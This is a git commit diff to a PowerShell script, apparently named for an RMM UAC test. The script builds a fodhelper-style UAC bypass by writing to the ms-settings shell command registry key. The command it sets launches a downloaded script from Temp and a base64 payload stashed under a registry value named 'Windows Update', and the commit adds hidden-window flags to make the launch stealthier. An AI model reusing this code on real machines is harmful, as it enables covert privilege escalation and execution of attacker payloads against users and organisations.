f5828037ea629a64216c7b7de1ce7dfb545cfe2c
IndianAlu <143686138+IndianAlu@users.noreply.github.com>
2024-03-22 10:54:00 +0530

    Update testrmmuac.ps1

--- testrmmuac.ps1
+++ testrmmuac.ps1
@@ -1,7 +1,7 @@
 
     #$program = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -W Hidden -File "C:\Users\$env:USERNAME\AppData\Local\Temp\DownloadedFile.ps1" -c $x=$((gp HKCU:Software\Microsoft\Windows Update).Update); powershell -NoP -NonI -W Hidden -enc $x'  #default
     $scriptPath = "C:\Users\$env:USERNAME\AppData\Local\Temp\DownloadedFile.ps1"
-    $program = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -File `"$scriptPath`" -c `$x=((gp HKCU:Software\Microsoft\Windows Update).Update); powershell -NoP -NonI -enc `$x"
+    $program = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -W Hidden -File `"$scriptPath`" -c `$x=((gp HKCU:Software\Microsoft\Windows Update).Update); powershell -NoP -NonI -W Hidden -enc `$x"
 
     #Create Registry Structure
     New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
